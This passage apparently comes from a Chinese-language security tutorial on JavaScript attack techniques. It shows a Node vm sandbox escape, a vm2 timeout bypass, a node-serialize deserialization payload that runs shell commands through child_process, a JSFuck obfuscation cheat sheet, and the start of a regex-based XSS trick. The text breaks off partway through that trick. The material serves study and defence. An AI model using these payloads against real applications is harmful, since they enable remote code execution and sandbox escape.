+&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; vm &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;vm&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; sandbox &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; whatIsThis &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; vm&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;runInNewContext&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token template-string&#34;&gt;&lt;span class=&#34;token template-punctuation string&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    const ForeignObject = this.constructor;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    const ForeignFunction = ForeignObject.constructor;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    const process = ForeignFunction(&#34;return process&#34;)();&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    const require = process.mainModule.require;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    require(&#34;fs&#34;);&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/span&gt;&lt;span class=&#34;token template-punctuation string&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; sandbox&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;考虑到 JavaScript 原生 vm 模块的缺陷，有开发者设计了 vm2 来提供一个更安全的隔离环境，但是在旧版本中同样存在一些逃逸方式，例如：&lt;/p&gt;
+&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;vm&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;runInNewContext&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token string&#34;&gt;&#39;Promise.resolve().then(()=&gt;&amp;#123;while(1)console.log(&#34;foo&#34;, Date.now());&amp;#125;); while(1)console.log(Date.now())&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token literal-property property&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;apply&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;console&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;arguments&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token literal-property property&#34;&gt;timeout&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;反序列化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反序列化&#34;&gt;#&lt;/a&gt; 反序列化&lt;/h1&gt;
+&lt;h2 id=&#34;简介-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-4&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
+&lt;p&gt;JavaScript 本身并没有反序列化的实现，但是一些库如 node-serialize、serialize-to-js 等支持了反序列化功能。这些库通常使用 JSON 形式来存储数据，但是和原生函数 JSON.parse、 JSON.stringify 不同，这些库支持任何对象的反序列化，特别是函数，如果使用不当，则可能会出现反序列化问题。&lt;/p&gt;
+&lt;h2 id=&#34;payload构造&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#payload构造&#34;&gt;#&lt;/a&gt; Payload 构造&lt;/h2&gt;
+&lt;p&gt;下面是一个最简单的例子，首先获得序列化后的输出&lt;/p&gt;
+&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; y &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token function-variable function&#34;&gt;rce&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token function&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;child_process&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;ls /&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token parameter&#34;&gt;error&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; stdout&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; stderr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;stdout&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; serialize &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;node-serialize&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Serialized: \n&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; serialize&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;y&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;上面执行后会返回&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;quot;rce&amp;quot;:&amp;quot;_$$ND_FUNC$$_function ()&amp;#123;require(&#39;child_process&#39;).exec(&#39;ls /&#39;, function(error, stdout, stderr) &amp;#123; console.log(stdout) &amp;#125;);&amp;#125;&amp;quot;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;不过这段 payload 反序列化后并不会执行，但是在 JS 中支持立即调用的函数表达式（Immediately Invoked Function Expression），比如  &lt;code&gt;(function () &amp;#123; /* code */ &amp;#125; ());&lt;/code&gt;  这样就会执行函数中的代码。那么可以使用这种方法修改序列化后的字符串来完成一次反序列化。最后的 payload 测试如下:&lt;/p&gt;
+&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; serialize &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;node-serialize&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; payload &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&amp;#123;&#34;rce&#34;:&#34;_$$ND_FUNC$$_function ()&amp;#123;require(\&#39;child_process\&#39;).exec(\&#39;ls /\&#39;, function(error, stdout, stderr) &amp;#123; console.log(stdout) &amp;#125;);&amp;#125;()&#34;&amp;#125;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;serialize&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;unserialize&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;payload构造-ii&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#payload构造-ii&#34;&gt;#&lt;/a&gt; Payload 构造 II&lt;/h2&gt;
+&lt;p&gt;以上提到的是 node-serialize 这类反序列化库的构造方式，还有一类库如 funcster，是使用直接拼接字符串构造函数的方式来执行。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;return &amp;quot;module.exports=(function(module,exports)&amp;#123;return&amp;#123;&amp;quot; + entries + &amp;quot;&amp;#125;;&amp;#125;)();&amp;quot;;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这种方式可以使用相应的闭合来构造 payload。&lt;/p&gt;
+&lt;h1 id=&#34;jsfuck-cheat-sheet&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jsfuck-cheat-sheet&#34;&gt;#&lt;/a&gt; jsfuck cheat sheet&lt;/h1&gt;
+&lt;h2 id=&#34;basic-values&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#basic-values&#34;&gt;#&lt;/a&gt; Basic values&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;undefined&lt;/code&gt;  &amp;gt;  &lt;code&gt;[][[]]&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;false&lt;/code&gt;  &amp;gt;  &lt;code&gt;![]&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;true&lt;/code&gt;  &amp;gt;  &lt;code&gt;!![]&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;NaN&lt;/code&gt;  &amp;gt;  &lt;code&gt;+[![]]&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;0&lt;/code&gt;  &amp;gt;  &lt;code&gt;+[]&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;1&lt;/code&gt;  &amp;gt;  &lt;code&gt;+!+[]&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;2&lt;/code&gt;  &amp;gt;  &lt;code&gt;!+[]+!+[]&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;basic-strings&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#basic-strings&#34;&gt;#&lt;/a&gt; Basic strings&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&#39;&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[]+[]&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&#39;undefined&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[]+[][[]]&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&#39;false&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[]+![]&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&#39;true&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[]+!![]&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&#39;NaN&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[]+(+[![]])&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&#39;0&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[]+(+[])&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&#39;1&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[]+(+!+[])&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&#39;2&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[]+(!+[]+!+[])&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&#39;10&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[+!+[]]+[+[]]&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&#39;11&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[+!+[]]+[+!+[]]&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&#39;100&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[+!+[]]+[+[]]+(+[])&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;higher-numbers&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#higher-numbers&#34;&gt;#&lt;/a&gt; Higher numbers&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;10&lt;/code&gt;  &amp;gt;  &lt;code&gt;+([+!+[]]+[+[]])&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;11&lt;/code&gt;  &amp;gt;  &lt;code&gt;+([+!+[]]+[+!+[]])&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;100&lt;/code&gt;  &amp;gt;  &lt;code&gt;+([+!+[]]+[+[]]+(+[]))&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;string-alphabet&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#string-alphabet&#34;&gt;#&lt;/a&gt; String alphabet&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&#39;a&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+![])[+!+[]]&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&#39;d&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+[][[]])[+!+[]+!+[]]&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&#39;e&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+!+[])[+!+[]+!+[]+!+[]]&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&#39;f&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+![])[+[]]&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&#39;i&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+[][[]])[+!+[]+!+[]+!+[]+!+[]+!+[]]&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&#39;l&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+![])[+!+[]+!+[]]&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&#39;n&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+[][[]])[+!+[]]&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&#39;r&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+!+[])[+!+[]]&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&#39;s&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+![])[+!+[]+!+[]+!+[]]&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&#39;t&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+!+[])[+[]]&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&#39;u&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+!+[])[+!+[]+!+[]]&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;trick&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#trick&#34;&gt;#&lt;/a&gt; Trick&lt;/h1&gt;
+&lt;h2 id=&#34;通过正则表达式构造特定字符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#通过正则表达式构造特定字符&#34;&gt;#&lt;/a&gt; 通过正则表达式构造特定字符&lt;/h2&gt;
+&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;empty &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;RegExp&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;prototype&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;flags&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;regSource &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;RegExp&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;prototype&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;source &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;regSource&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;toString &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;prototype&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;shift&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;regSource&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;length &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;left  &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; regSource &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; empty &lt;span class=&#34;token comment&#34;&gt;// 生成 (&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;quest &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; regSource &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; empty &lt;span class=&#34;token comment&#34;&gt;// 生成？&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;colon &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; regSource &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; empty &lt;span class=&#34;token comment&#34;&gt;// 生成 :&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;right &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; regSource &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; empty &lt;span class=&#34;token comment&#34;&gt;// 生成 )&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;xss &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;xss&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;source &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;xss&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;xss&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;flags &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token 